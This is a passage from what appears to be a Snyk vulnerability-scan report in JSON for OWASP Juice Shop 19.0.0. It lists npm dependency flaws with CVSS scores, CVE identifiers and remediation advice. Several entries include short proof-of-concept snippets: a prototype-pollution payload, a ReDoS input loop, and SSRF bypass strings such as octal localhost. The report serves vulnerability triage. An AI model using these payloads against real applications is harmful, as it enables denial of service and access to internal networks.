              ],
              "functionId": {
                "filePath": "index.js",
                "functionName": "module.exports"
              }
            }
          ],
          "alternativeIds": [],
          "disclosureTime": "2019-10-15T20:29:24Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2020-02-27T13:28:41Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:50:22.598107Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "download@8.0.0",
            "decompress@4.2.1",
            "decompress-targz@4.1.1",
            "decompress-tar@4.1.1"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "decompress-tar",
          "version": "4.1.1",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-EIVINDFJELDSTADDOT-564434",
          "title": "Prototype Pollution",
          "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L/E:P/RL:O/RC:C",
          "credit": [
            "JHU System Security Lab"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 4.2,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "eivindfjeldstad-dot",
          "references": [
            {
              "url": "https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b",
              "title": "GitHub Commit"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "cvssV3BaseScore": 5.3,
              "modificationTime": "2024-03-11T09:51:08.791834Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L/E:P/RL:O/RC:C",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 4.2,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T13:57:22.274981Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "assigner": "NVD",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:51:08.791834Z"
            }
          ],
          "description": "## Overview\n[eivindfjeldstad-dot](https://www.npmjs.com/package/eivindfjeldstad-dot) is a module that Gets and sets object properties with dot notation.\r\n\r\n**Note:** this package has been deprecated and moved into `@eivifj/dot`.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `set` could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.\r\n\r\n## PoC\r\n```\r\nvar a = require(\"eivindfjeldstad-dot\")\r\nvar path = \"__proto__.toString\";\r\na.set({},path,\"JHU\");\r\nconsole.log({}.toString);\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nThere is no fixed version for `eivindfjeldstad-dot`.\n## References\n- [GitHub Commit](https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b)\n",
          "epssDetails": {
            "percentile": "0.55117",
            "probability": "0.00326",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2020-7639"
            ],
            "CWE": [
              "CWE-1321"
            ]
          },
          "packageName": "eivindfjeldstad-dot",
          "proprietary": true,
          "creationTime": "2020-04-05T14:48:43.897856Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2020-04-05T00:00:00Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2020-04-05T00:00:00Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:51:08.791834Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 97,
          "from": [
            "juice-shop@19.0.0",
            "yaml-schema-validator@1.2.3",
            "validate@4.5.1",
            "eivindfjeldstad-dot@0.0.1"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "eivindfjeldstad-dot",
          "version": "0.0.1",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-GOT-2932019",
          "title": "Open Redirect",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
          "credit": [
            "Unknown"
          ],
          "semver": {
            "vulnerable": [
              "<11.8.5",
              ">=12.0.0 <12.1.0"
            ]
          },
          "exploit": "Not Defined",
          "fixedIn": [
            "11.8.5",
            "12.1.0"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 5.4,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "got",
          "references": [
            {
              "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
              "title": "GitHub Diff"
            },
            {
              "url": "https://github.com/sindresorhus/got/pull/2047",
              "title": "GitHub PR"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "cvssV3BaseScore": 5.3,
              "modificationTime": "2024-03-11T09:49:40.538405Z"
            },
            {
              "assigner": "Red Hat",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "cvssV3BaseScore": 5.3,
              "modificationTime": "2024-03-11T09:53:59.174248Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 5.4,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T13:55:26.874968Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "assigner": "NVD",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:49:40.538405Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "assigner": "Red Hat",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:59.174248Z"
            }
          ],
          "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
          "epssDetails": {
            "percentile": "0.73147",
            "probability": "0.00788",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2022-33987"
            ],
            "CWE": [
              "CWE-601"
            ]
          },
          "packageName": "got",
          "proprietary": false,
          "creationTime": "2022-06-19T09:23:24.210132Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2022-06-19T08:33:16Z",
          "exploitDetails": {
            "sources": [],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Not Defined",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Not Defined",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2022-06-19T15:33:44.269688Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:53:59.174248Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "download@8.0.0",
            "got@8.3.2"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "got",
          "version": "8.3.2",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-HBS-1566555",
          "title": "Information Exposure",
          "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N/E:P",
          "credit": [
            "Agustin Gianni"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "low",
          "cvssScore": 3.4,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "hbs",
          "references": [
            {
              "url": "https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/",
              "title": "PoC and Explanation"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
              "cvssV3BaseScore": 5.3,
              "modificationTime": "2024-03-11T09:50:48.662388Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N/E:P",
              "assigner": "Snyk",
              "severity": "low",
              "baseScore": 3.4,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T14:04:06.258873Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
              "assigner": "NVD",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:50:48.662388Z"
            }
          ],
          "description": "## Overview\n[hbs](https://www.npmjs.org/package/hbs) is an Express.js template engine plugin for Handlebars\n\nAffected versions of this package are vulnerable to Information Exposure. `hbs` mixes pure template data with engine configuration options through the `Express` render API. By overwriting internal configuration options a file disclosure vulnerability may be triggered in downstream applications.\n## Remediation\nThere is no fixed version for `hbs`.\n## References\n- [PoC and Explanation](https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/)\n",
          "epssDetails": {
            "percentile": "0.52966",
            "probability": "0.00299",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2021-32822"
            ],
            "CWE": [
              "CWE-200"
            ],
            "GHSL": [
              "GHSL-2021-020"
            ]
          },
          "packageName": "hbs",
          "proprietary": false,
          "creationTime": "2021-08-17T11:02:48.815315Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2021-08-17T10:50:41Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2021-08-17T14:14:00.465869Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:50:48.662388Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "juice-shop@19.0.0",
            "hbs@4.2.0"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "hbs",
          "version": "4.2.0",
          "severityWithCritical": "low"
        },
        {
          "id": "SNYK-JS-HTTPCACHESEMANTICS-3248783",
          "title": "Regular Expression Denial of Service (ReDoS)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
          "credit": [
            "Carter Snook"
          ],
          "semver": {
            "vulnerable": [
              "<4.1.1"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [
            "4.1.1"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 5.3,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "http-cache-semantics",
          "references": [
            {
              "url": "https://github.com/kornelski/http-cache-semantics/commit/560b2d8ef452bbba20ffed69dc155d63ac757b74",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/kornelski/http-cache-semantics/blob/master/index.js%23L83",
              "title": "Vulnerable Code"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "high",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "cvssV3BaseScore": 7.5,
              "modificationTime": "2024-03-11T09:52:46.291686Z"
            },
            {
              "assigner": "Red Hat",
              "severity": "high",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "cvssV3BaseScore": 7.5,
              "modificationTime": "2024-03-11T09:53:59.788609Z"
            },
            {
              "assigner": "SUSE",
              "severity": "high",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "cvssV3BaseScore": 7.5,
              "modificationTime": "2024-03-11T09:53:08.951745Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2025-02-16T14:02:23.374199Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "assigner": "NVD",
              "severity": "high",
              "baseScore": 7.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:52:46.291686Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "assigner": "Red Hat",
              "severity": "high",
              "baseScore": 7.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:59.788609Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
              "assigner": "SUSE",
              "severity": "high",
              "baseScore": 7.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:08.951745Z"
            }
          ],
          "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.\n## PoC\nRun the following script in Node.js after installing the `http-cache-semantics` NPM package:\r\n\r\n```js\r\nconst CachePolicy = require(\"http-cache-semantics\");\r\n\r\nfor (let i = 0; i <= 5; i++) {\r\n\r\nconst attack = \"a\" + \" \".repeat(i * 7000) +\r\n\"z\";\r\n\r\nconst start = performance.now();\r\nnew CachePolicy({\r\nheaders: {},\r\n}, {\r\nheaders: {\r\n\"cache-control\": attack,\r\n},\r\n\r\n\r\n});\r\nconsole.log(`${attack.length}: ${performance.now() - start}ms`);\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `http-cache-semantics` to version 4.1.1 or higher.\n## References\n- [GitHub Commit](https://github.com/kornelski/http-cache-semantics/commit/560b2d8ef452bbba20ffed69dc155d63ac757b74)\n- [Vulnerable Code](https://github.com/kornelski/http-cache-semantics/blob/master/index.js#L83)\n",
          "epssDetails": {
            "percentile": "0.37498",
            "probability": "0.00159",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2022-25881"
            ],
            "CWE": [
              "CWE-1333"
            ],
            "GHSA": [
              "GHSA-8x6c-cv3v-vp6g",
              "GHSA-rc47-6667-2j5j"
            ]
          },
          "packageName": "http-cache-semantics",
          "proprietary": true,
          "creationTime": "2023-01-26T15:43:26.870465Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2023-01-26T15:40:19Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2023-01-30T14:39:52.807542Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-02-16T14:02:23.374199Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "download@8.0.0",
            "got@8.3.2",
            "cacheable-request@2.1.4",
            "http-cache-semantics@3.8.1"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "http-cache-semantics",
          "version": "3.8.1",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-IP-12704893",
          "title": "Server-side Request Forgery (SSRF)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
          "credit": [
            "Unknown"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 7.9,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "ip",
          "references": [
            {
              "url": "https://github.com/indutny/node-ip/issues/160",
              "title": "GitHub Issue"
            },
            {
              "url": "https://cosmosofcyberspace.github.io/CVE-Application-Document.html",
              "title": "Security Report"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "Red Hat",
              "severity": "low",
              "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
              "cvssV3BaseScore": 3.2,
              "modificationTime": "2025-09-17T17:33:25.769932Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:L/E:P",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 7.9,
              "cvssVersion": "4.0",
              "modificationTime": "2025-09-16T17:57:52.698394Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
              "assigner": "Snyk",
              "severity": "critical",
              "baseScore": 10,
              "cvssVersion": "3.1",
              "modificationTime": "2025-09-16T17:57:52.698394Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
              "assigner": "Red Hat",
              "severity": "low",
              "baseScore": 3.2,
              "cvssVersion": "3.1",
              "modificationTime": "2025-09-17T17:33:25.769932Z"
            }
          ],
          "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via the `ip.isPublic()` and `ip.isPrivate()` functions. An attacker can interact with internal network resources by supplying specially crafted IP address such as octal localhost format (\"017700000001\") that is incorrectly identified as public.\r\n\r\n**Note:**\r\n\r\nThis issue exists because of an incomplete fix for CVE-2024-29415.\n## PoC\nTest octal localhost bypass:\r\n  \r\n`node -e \"const ip=require('ip'); console.log('017700000001 bypass:', ip.isPublic('017700000001'));\"` - returns `true`\n## Remediation\nThere is no fixed version for `ip`.\n## References\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/160)\n- [Security Report](https://cosmosofcyberspace.github.io/CVE-Application-Document.html)\n",
          "epssDetails": {
            "percentile": "0.02394",
            "probability": "0.00016",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2025-59436"
            ],
            "CWE": [
              "CWE-918"
            ]
          },
          "packageName": "ip",
          "proprietary": false,
          "creationTime": "2025-09-16T11:05:36.475343Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2025-09-16T02:44:59Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2025-09-16T17:54:26.511100Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-09-17T17:33:25.769932Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "express-ipfilter@1.3.2",
            "ip@2.0.1"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "ip",
          "version": "2.0.1",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-IP-12761655",
          "title": "Server-side Request Forgery (SSRF)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
          "credit": [
            "Unknown"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "high",
          "cvssScore": 7.9,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "ip",
          "references": [
            {
              "url": "https://github.com/indutny/node-ip/issues/160",
              "title": "GitHub Issue"
            },
            {
              "url": "https://cosmosofcyberspace.github.io/CVE-Application-Document.html",
              "title": "Security Report"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:L/E:P",
              "assigner": "Snyk",
              "severity": "high",
              "baseScore": 7.9,
              "cvssVersion": "4.0",
              "modificationTime": "2025-09-16T16:37:35.338154Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L/E:P",
              "assigner": "Snyk",
              "severity": "critical",
              "baseScore": 10,
              "cvssVersion": "3.1",
              "modificationTime": "2025-09-16T16:37:35.338154Z"
            }
          ],
          "description": "## Overview\n[ip](https://github.com/indutny/node-ip) is a Node library.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via the `ip.isPublic()` and `ip.isPrivate()` functions. An attacker can interact with internal network resources by supplying specially crafted IP address such as null route (\"0\") that is being incorrectly identified as public. \r\n\r\n**Note:**\r\nThis issue exists because of an incomplete fix for CVE-2024-29415.\r\n\r\nExploit is only possible if the application and operating system interpret connection attempts to `0` or `0.0.0.0` as connections to `127.0.0.1`.\n## PoC\nTest null route bypass:\r\n\r\n`node -e \"const ip=require('ip'); console.log('0 bypass:', ip.isPublic('0'));\"` - returns `true`\n## Remediation\nThere is no fixed version for `ip`.\n## References\n- [GitHub Issue](https://github.com/indutny/node-ip/issues/160)\n- [Security Report](https://cosmosofcyberspace.github.io/CVE-Application-Document.html)\n",
          "epssDetails": {
            "percentile": "0.02394",
            "probability": "0.00016",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2025-59437"
            ],
            "CWE": [
              "CWE-918"
            ]
          },
          "packageName": "ip",
          "proprietary": false,
          "creationTime": "2025-09-16T16:34:42.744934Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2025-09-16T02:44:58Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
